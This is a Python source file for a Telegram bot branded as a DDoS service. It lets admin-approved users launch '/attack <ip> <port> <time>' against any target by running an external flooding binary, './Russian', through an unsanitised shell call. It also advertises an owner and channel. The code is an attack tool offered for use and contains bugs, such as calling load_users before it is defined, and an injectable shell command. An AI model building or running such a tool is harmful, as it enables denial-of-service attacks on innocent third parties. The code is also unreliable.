
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = 'YOURE BOT TOKEN'
ADMIN_USER_ID = 827262626626226
USERS_FILE = 'users.txt'

# Global set to store approved users
approved_users = load_users()

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users():
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in approved_users)

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*👿 WELCOME TO GODxCHEATS DDOS👿*\n"
        "*--------------------------------------------*\n\n"
        "*JOIN :-  https://t.me/+03wLVBPurPk2NWRl*\n"
        "*use /attack for launch attack *\n"
        "*use /help for all available commands*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*📚 𝗛𝗲𝗹𝗽 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 📚*\n\n"
        "*🔹 /start* - to welcome message \n"
        "*🔹 /attack <ip> <port> <time>* - for use launch attack \n"
        "*🔹 /approve <user_id>* - approve to new user\n"
        "*🔹 /remove <user_id>* - removed old user\n"
        "*🔹 /help* - for all available commands"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝗮𝗱𝗺𝗶𝗻 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻𝘀 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.*", parse_mode='Markdown')
        return

    target_user_id = context.args[0] if context.args else None
    if target_user_id and target_user_id not in approved_users:
        approved_users.add(target_user_id)
        save_users()
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱!*\n\n*🌟 𝗧𝗵𝗲𝘆 𝗰𝗮𝗻 𝗻𝗼𝗺𝗶𝗻𝗮𝗹𝗹𝘆 𝘂𝘀𝗲 𝘁𝗵𝗲 /attack 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗨𝘀𝗲𝗿 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗼𝗿 𝗻𝗼𝘁 𝘃𝗮𝗹𝗶𝗱 𝗨𝘀𝗲𝗿 𝗜𝗗!*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝗮𝗱𝗺𝗶𝗻 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻𝘀 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.*", parse_mode='Markdown')
        return

    target_user_id = context.args[0] if context.args else None
    if target_user_id and target_user_id in approved_users:
        approved_users.discard(target_user_id)
        save_users()
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱!*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗼𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in approved_users:
        await context.bot.send_message(chat_id=chat_id, text="*🖕 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 🧑‍💻*\n*💬 𝗖𝗼𝗻𝗧𝗮𝗰𝘁 @GODxAloneBOY*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*🔧 𝗨𝘀𝗲𝗿 𝘁𝗵𝗲 𝗳𝗼𝗿𝗺𝗮𝘁: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        "*⚡ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ⚡*\n"
        f"*👙 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗽:* {ip}\n"
        f"*😉 𝗣𝗼𝗿𝘁:* {port}\n"
        f"*😂 𝗧𝗶𝗺𝗲:* {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
        "*🔥 𝗔𝗟𝗟 𝗛𝗔𝗜𝗟 𝗧𝗛𝗘 𝗛𝗔𝗖𝗞𝗘𝗥𝗦!*\n"
        "*⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗻𝗼𝘁𝗲: 𝗜𝘁 𝗺𝗮𝘆 𝘁𝗮𝗸𝗲 𝘀𝗼𝗺𝗲 𝘁𝗶𝗺𝗲.*"
        "*💬 𝗢𝘄𝗻𝗲𝗿 @GODxAloneBOY*\n"
        "*📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: https://t.me/+03wLVBPurPk2NWRl*"
    ), parse_mode='Markdown')

    # Simulate attack process
    await run_attack(chat_id, ip, port, time, context)

async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./Russian {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text=(
            "*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅*\n"
            "*💥 𝗧𝗮𝗿𝗴𝗲𝘁 𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗗!* \n"
            "*🌟 𝗠𝗮𝘁𝗰𝗵 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹!*\n"
            f"*👙 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗽:* {ip}\n"
            f"*😉 𝗣𝗼𝗿𝘁:* {port}\n"
            f"*😂 𝗧𝗶𝗺𝗲:* {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
            "*⚡ 𝗧𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹!*"
        ), parse_mode='Markdown')

# Main function to run the bot
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == "__main__":
    main()